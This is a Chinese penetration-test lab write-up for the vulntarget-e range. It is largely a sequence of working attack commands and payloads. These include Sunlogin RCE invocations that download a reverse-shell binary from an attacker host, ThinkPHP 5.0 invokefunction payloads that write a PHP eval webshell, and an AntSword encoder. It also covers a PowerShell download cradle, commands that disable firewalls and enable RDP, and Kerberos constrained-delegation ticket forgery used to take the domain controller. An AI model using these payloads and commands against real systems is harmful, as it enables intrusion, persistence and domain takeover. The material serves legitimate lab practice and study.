# vulntarget-e最简洁思路打靶记录-先知社区

> **来源**: https://xz.aliyun.com/news/18494  
> **文章ID**: 18494

---

# vulntarget-e

拓扑图

![](data:image/png;base64,)

*​*

## 外网打点

全端口扫描

![](data:image/png;base64,)

*​*

POC检测到漏洞CNVD-2022-03672

抓包<http://10.10.10.143:49689/cgi-bin/rpc>

修改请求方法POST

添加action=verify-haras字段

发包获取到session：ciiHpsOHS1UtC5ZfZMrA1gApw9htv8ph

![](data:image/png;base64,)

*​*

修改参数，添加session，命令执行

![](data:image/png;base64,)

*​*

工具命令执行：<https://github.com/ce-automne/SunloginRCE>

![](data:image/png;base64,)

*​*

![](data:image/png;base64,)

*​*

wget下载反向马，dir无文件

sunRce.exe -t rce -h 10.10.10.143 -p 49689 -c "wget http://10.10.10.128:888/tcp\_windows\_amd64.exe -O C:\Windows\system32 cp\_windows\_amd64.exe"  
sunRce.exe -t rce -h 10.10.10.143 -p 49689 -c "dir"

杀软查询

![](data:image/png;base64,)

*​*

CS生成.c格式木马，掩日免杀生成免杀马

上传执行

![](data:image/png;base64,)

*​*

查看网卡信息

10.10.10.143

192.168.100.155

![](data:image/png;base64,)

*​*

抓取hash解密->win2008

![](data:image/png;base64,)

*​*

开启远程，信息收集

REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG\_DWORD /d 00000000 /f   
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow

![](data:image/png;base64,)

*​*

windows机器判定是否存在域以及是否在域内

不存在域

![](data:image/png;base64,)

*​*

## 内网横向

开启socks5代理

fscan快速打点

没有扫描到192.168.100.1/24网段IP

shell arp -a查看局域网设备连接情况

探测到192.168.100.131

![](data:image/png;base64,)

*​*

fscan快速打点

![](data:image/png;base64,)

*​*

宝塔面板

![](data:image/png;base64,)

*​*

结合桌面拿到的域名，制作hosts碰撞：<https://github.com/pmiaowu/HostCollision>

报错中徘徊，cs的socks代理貌似有点不稳定，远程登录关闭杀毒，上线vshell，也不稳定，windows一直掉线

只能手动上线

![](data:image/png;base64,)

*​*

www.cJO6w10YLS.com访问到站点，修改hosts，访问http://www.cjo6w10yls.com/

外网主机火狐历史访问记录

​

![](data:image/png;base64,)

*​*

thinkphp框架

![](data:image/png;base64,)

*​*

尝试<http://www.cjo6w10yls.com/vulntarget/public/?s=1>显示报错，版本为V5.0.15

代码审计不擅长，直接利用官方POC：

?s=index/think\app/invokefunction&function=call\_user\_func\_array&vars[0]=file\_put\_contents&vars[1][0]=../../1.php&vars[1][1]=test123

![](data:image/png;base64,)

*​*

写入shell

?s=index/think\app/invokefunction&function=call\_user\_func\_array&vars[0]=file\_put\_contents&vars[1][0]=../../9.php&vars[1][1]=%3C?php%20eval(urldecode(urldecode(urldecode($\_REQUEST['xx']))));?%3E

创建蚁键编码器

/\*\*   
 \* php::3次url   
 \* <?php eval(urldecode(urldecode(urldecode($\_REQUEST['test']))));?>   
 \*/   
   
'use strict';   
   
 // ########## 请在下方编写你自己的代码 ###################   
function forceEncode(s) {   
 return Array.from(s).map(i=>'%'+i.charCodeAt(0).toString(16).padStart(2,'0')).join('')   
}   
   
module.exports = (pwd, data, ext={}) => {   
 const payload = data['\_']   
 data[pwd] = forceEncode(forceEncode(payload));   
 delete data['\_'];   
 console.log(data);   
 return data;   
}

![](data:image/png;base64,)

*​*

ret=127

使用脚本：<https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php>

![](data:image/png;base64,)

*​*

home目录下含有key文件

![](data:image/png;base64,)

*​*

## ubuntu

尝试连接vulntarget，失败

连接root，显示未受保护的私钥文件，chmod +x 600

![](data:image/png;base64,)

*​*

ufw disable关闭防火墙

winddows无python，传安装开启http服务

ubuntu下载运行

![](data:image/png;base64,)

*​*

windows外网正向连接ubuntu

192.168.88.100

192.168.100.131

![](data:image/png;base64,)

*​*

二层代理，proxifier配置代理链

发现另一台机器IP

![](data:image/png;base64,)

*​*

​

fscan扫描，ms17-010偶尔蓝屏，优先sqlserver与smb，弱密码爆破

smb：administrator/admin@123

![](data:image/png;base64,)

*​*

尝试wmiexec.py连接

附件-codec 936改变编码

![](data:image/png;base64,)

*​*

## windows

192.168.88.102

10.0.10.9

![](data:image/png;base64,)

*​*

tasklist /SVC无杀毒

ubuntu开启http服务：**php -S 0.0.0.0:8888**

powershell ( new-object System.Net.WebClient).DownloadFile( 'http://192.168.88.100:8884/tcp\_windows\_amd64.exe' , 'C:\Users\Administrator\s.exe' )

![](data:image/png;base64,)

*​*

关闭防火墙

netsh firewall show state   
netsh firewall set opmode mode=disable

成功上线vshell

systeminfo发现域

![](data:image/png;base64,)

*​*

域控地址

![](data:image/png;base64,)

*​*

开远程

REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG\_DWORD /d 00000000 /f   
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow

![](data:image/png;base64,)

*​*

win2008/qweASD123

## 票据

探测约束委派

AdFind.exe -h 10.0.10.10 -u win2008 -up qweASD123 -b "DC=vulntarget,DC=com" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=\*))" cn distinguishedName msds-allowedtodelegateto

![](data:image/png;base64,)

*​*

票据申请

proxychains4 python3 /usr/share/doc/python3-impacket/examples/getST.py -dc-ip WIN-1PV25H8UJPN.vulntarget.com vulntarget.com/win2008:qweASD123 -spn cifs/WIN-1PV25H8UJPN.vulntarget.com -impersonate administrator

![](data:image/png;base64,)

*​*

导入票据

export KRB5CCNAME=administrator@cifs\_WIN-1PV25H8UJPN.vulntarget.com@VULNTARGET.COM.ccache

登录

proxychains4 python3 /usr/share/doc/python3-impacket/examples/smbexec.py -no-pass -k WIN-1PV25H8UJPN.vulntarget.com -codec 936

![](data:image/png;base64,)

*​*

![](data:image/png;base64,)

*​*

## 总结

外网：向日葵漏洞，免杀马，下载运行上线cs，开远程关防火墙，上线vshell，抓密码，开代理

ubuntu：thinkphp写入shell，绕过滤，ret127绕过命令执行，泄露ssh密钥

windows域：smb弱密码，wmiexec.py连接，定位域，开远程，域信息探测

域控：申请伪造票据，导入，smbexec.py连接

​
